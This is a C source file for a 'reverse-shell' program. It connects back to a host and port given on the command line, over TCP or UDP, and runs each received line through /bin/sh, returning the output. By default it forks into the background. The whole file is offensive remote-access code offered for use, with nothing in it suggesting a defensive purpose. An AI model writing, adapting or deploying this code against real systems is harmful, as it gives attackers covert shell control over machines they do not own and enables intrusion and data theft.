#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>

#define PROGNAME	"reverse-shell"
#define SHELL		"sh"
#define PATH		"/bin"
#define PATHSHELL	PATH "/" SHELL

#include "common.h"
#include "plugin.h"
#include "plain_tcp.h"
#include "plain_udp.h"
#include "popen.h"


#define RSHELL_F_NOFORK	(1 << 0)

struct rshell
{
	char		*host;
	char		*service;
	uint16_t	port;
	int		family;
	char		*shell;
	unsigned	flags;
	struct plugin	*plugin;
};


static void usage(void)
{
	fprintf(stderr, "usage: %s [options] <host> <port>\n", PROGNAME);
	fprintf(stderr, "options:\n");
	fprintf(stderr, "\t-h         : display this and exit\n");
	fprintf(stderr, "\t-v         : display version and exit\n");
	fprintf(stderr, "\t-f         : foreground mode (eg: no fork)\n");
	fprintf(stderr, "\t-4         : use IPv4 socket\n");
	fprintf(stderr, "\t-6         : use IPv6 socket\n");
	fprintf(stderr, "\t-s <shell> : give the path shell (default: %s)\n", PATHSHELL);
	fprintf(stderr, "\t-u         : use an UDP socket\n");
}


static int command(const struct rshell *rshell, int sockfd)
{
	struct sockaddr_storage	storage;
	struct sockaddr		*peeraddr = (struct sockaddr *) &storage;
	socklen_t		addrlen = sizeof(struct sockaddr_storage);
	ssize_t			len;
	FILE			*fp;
	char			*cmd;

	while ( 1 )
	{
		char	buf[CMD_BUFFER_LEN] = {0};

		if ( (len = rshell->plugin->recv(sockfd, buf, sizeof(buf) - sizeof(" 2>&1"), 0, peeraddr, &addrlen)) <= 0 )
			return -1;

		cmd = trim(buf, &len);

		if ( ! len )
			continue;

		strncat(cmd, " 2>&1", sizeof(buf));

		if ( (fp = popen_shell(rshell->shell, cmd, "r")) == NULL )
			continue;

		while ( (len = fread(buf, 1, sizeof(buf), fp)) > 0 )
			rshell->plugin->send(sockfd, buf, len, 0, peeraddr, addrlen);

		pclose_shell(fp);
	}

	return 0;
}


static void reverse_shell(const struct rshell *rshell)
{
	int		sockfd;
	struct addrinfo	hints = {0};

	hints.ai_family = rshell->family;

	if ( (sockfd = rshell->plugin->connect(&hints, rshell->host, rshell->service)) < 0 )
		return;

	command(rshell, sockfd);
}


static void rshell_init(struct rshell *rshell)
{
	rshell->family	= AF_UNSPEC;
	rshell->shell	= PATHSHELL;
	rshell->flags	= 0;
	rshell->plugin	= &plain_tcp_plugin;
}


static int rshell_set_port(struct rshell *rshell, char *port)
{
	long int	res;

	res = strtol(port, NULL, 10);

	if ( res <= 0 || res > 0xffff )
		return -1;

	rshell->service = port;
	rshell->port = (uint16_t) res;

	return 0;
}


int main(int argc, char *argv[])
{
	int		c;
	pid_t		child;
	struct rshell	rshell;

	rshell_init(&rshell);

	while ( (c = getopt(argc, argv, "46fhs:uv")) != -1 )
	{
		switch ( c )
		{
			case '4':
			rshell.family = AF_INET;
			break;

			case '6':
			rshell.family = AF_INET6;
			break;

			case 'f':
			rshell.flags |= RSHELL_F_NOFORK;
			break;

			case 'h':
			usage();
			return 0;

			case 's':
			rshell.shell = optarg;
			break;

			case 'u':
			rshell.plugin = &plain_udp_plugin;
			break;

			case 'v':
			version();
			return 0;
		}
	}

	argv += optind;
	argc -= optind;

	if ( argc != 2 )
	{
		usage();
		return -1;
	}

	rshell.host = argv[0];
	if ( rshell_set_port(&rshell, argv[1]) )
	{
		fprintf(stderr, "Invalid port %s\n", argv[1]);
		return -1;
	}

	/* Fork and connect back
	 */
	if ( (rshell.flags & RSHELL_F_NOFORK) || (child = fork()) == 0 )
		reverse_shell(&rshell);
	else
		printf("child pid: %d\n", child);

	return 0;
}
